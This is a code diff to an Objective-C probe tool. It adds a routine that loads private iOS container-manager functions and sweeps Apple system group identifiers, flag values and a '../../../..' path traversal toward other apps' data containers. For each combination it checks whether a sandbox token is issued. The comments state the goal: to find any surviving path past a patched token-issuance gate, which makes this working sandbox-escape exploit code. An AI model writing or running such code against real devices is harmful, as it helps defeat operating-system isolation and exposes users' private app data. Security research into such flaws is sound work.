@@ -340,6 +340,120 @@ static NSMutableDictionary *runSingleProbe(NSString *name, NSString *path,
     return result;
 }
 
+// ---- variant matrix ------------------------------------------------------
+// On builds where the canonical bad_query route is blocked at token issuance,
+// sweep start-group x flags x part x traversal to find any surviving path.
+// A token that is issued but not consumed still proves the issuance gate is
+// open for that combination.
+static NSArray<NSDictionary *> *runVariantMatrix(NSString *targetPath)
+{
+    NSMutableArray *results = [NSMutableArray array];
+    logLine(@"==== variant matrix start ====");
+
+    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib",
+                       RTLD_NOW | RTLD_LOCAL);
+    if (!mgr) {
+        logStep(NO, @"matrix dlopen", @"libsystem_containermanager");
+        return results;
+    }
+    void *(*query_create)(void) = dlsym(mgr, "container_query_create");
+    void (*query_set_class)(void *, uint64_t) = dlsym(mgr, "container_query_set_class");
+    void (*query_set_group_identifiers)(void *, xpc_object_t) = dlsym(mgr, "container_query_set_group_identifiers");
+    void (*query_set_flags)(void *, uint64_t) = dlsym(mgr, "container_query_operation_set_flags");
+    void (*query_set_part)(void *, uint64_t) = dlsym(mgr, "container_query_operation_set_part");
+    void (*query_set_part_domain)(void *, const char *) = dlsym(mgr, "container_query_operation_set_part_domain");
+    void *(*query_get_single_result)(void *) = dlsym(mgr, "container_query_get_single_result");
+    void (*query_free)(void *) = dlsym(mgr, "container_query_free");
+    char *(*copy_sandbox_token)(void *) = dlsym(mgr, "container_copy_sandbox_token");
+    if (!query_create || !query_set_class || !query_set_group_identifiers || !query_set_flags ||
+        !query_set_part || !query_set_part_domain || !query_get_single_result || !query_free ||
+        !copy_sandbox_token) {
+        logStep(NO, @"matrix dlsym", @"one or more symbols missing");
+        dlclose(mgr);
+        return results;
+    }
+    logStep(YES, @"matrix symbols", @"all resolved");
+
+    NSArray<NSString *> *groups = @[
+        @"systemgroup.com.apple.mobilegestaltcache",
+        @"systemgroup.com.apple.lsd.iconscache",
+        @"systemgroup.com.apple.configurationprofiles",
+        @"systemgroup.com.apple.installcoordinationd",
+    ];
+    NSArray<NSNumber *> *flags = @[
+        @(0x900000000ULL),
+        @(0x800000000ULL),
+        @(0x8100000000ULL),
+        @(0x080000000ULL),
+    ];
+    NSArray<NSNumber *> *parts = @[@0, @3];
+    NSArray<NSNumber *> *traversals = @[@NO, @YES];
+
+    for (NSString *group in groups) {
+        for (NSNumber *flag in flags) {
+            for (NSNumber *part in parts) {
+                for (NSNumber *traversal in traversals) {
+                    NSMutableDictionary *entry = [NSMutableDictionary dictionary];
+                    entry[@"Group"] = group;
+                    entry[@"Flags"] = [NSString stringWithFormat:@"0x%llx",
+                        flag.unsignedLongLongValue];
+                    entry[@"Part"] = part;
+                    entry[@"Traversal"] = traversal;
+
+                    void *query = query_create();
+                    if (!query) {
+                        entry[@"Status"] = @"failed";
+                        entry[@"Stage"] = @"query_create";
+                        [results addObject:entry];
+                        continue;
+                    }
+                    query_set_class(query, 13);
+                    xpc_object_t identifier = xpc_string_create(group.UTF8String);
+                    query_set_group_identifiers(query, identifier);
+                    query_set_part(query, part.unsignedLongLongValue);
+                    if (traversal.boolValue) {
+                        NSString *traversalPath =
+                            [NSString stringWithFormat:@"../../../../../../../..%@", targetPath];
+                        query_set_part_domain(query, traversalPath.UTF8String);
+                    }
+                    query_set_flags(query, flag.unsignedLongLongValue);
+
+                    void *queryResult = query_get_single_result(query);
+                    if (!queryResult) {
+                        entry[@"Status"] = @"denied";
+                        entry[@"Stage"] = @"get_single_result";
+                        query_free(query);
+                        [results addObject:entry];
+                        continue;
+                    }
+                    char *token = copy_sandbox_token(queryResult);
+                    if (!token) {
+                        entry[@"Status"] = @"token-denied";
+                        entry[@"Stage"] = @"copy_sandbox_token";
+                    } else {
+                        entry[@"Status"] = @"TOKEN-OK";
+                        free(token);
+                    }
+                    query_free(query);
+                    [results addObject:entry];
+                    if ([entry[@"Status"] isEqualToString:@"TOKEN-OK"])
+                        logStep(YES, @"matrix hit",
+                            [NSString stringWithFormat:@"group=%@ flags=%@ part=%@ traversal=%@",
+                                group, entry[@"Flags"], part, traversal]);
+                }
+            }
+        }
+    }
+    dlclose(mgr);
+    NSUInteger ok = 0;
+    for (NSDictionary *entry in results)
+        if ([entry[@"Status"] isEqualToString:@"TOKEN-OK"]) ok++;
+    logStep(YES, @"matrix done",
+        [NSString stringWithFormat:@"%lu combos, %lu token-ok",
+            (unsigned long)results.count, (unsigned long)ok]);
+    return results;
+}
+
 // BadQueryProbeRun: run every probe, write results and a full step log.
 // Synchronous; call from a background queue.
 static void BadQueryProbeRunInternal(void)
@@ -418,11 +532,16 @@ static void BadQueryProbeRunInternal(void)
             }
         }
 
+        // Variant matrix: sweep group x flags x part x traversal to locate
+        // any token-issuance combination that still survives on this build.
+        NSArray<NSDictionary *> *matrix = runVariantMatrix(@"/var/mobile/Containers/Data/Application");
+
         NSDictionary *report = @{
-            @"Version": @1,
+            @"Version": @2,
             @"CreatedAt": NSDate.date,
             @"Environment": environmentInfo(),
             @"Probes": results,
+            @"VariantMatrix": matrix,
             @"SacrificeGroupConfigured": @(sacrificeGroupId().length > 0),
         };
         NSString *resultsPath = [probeRoot() stringByAppendingPathComponent:@"BadQuery Probe Results.plist"];
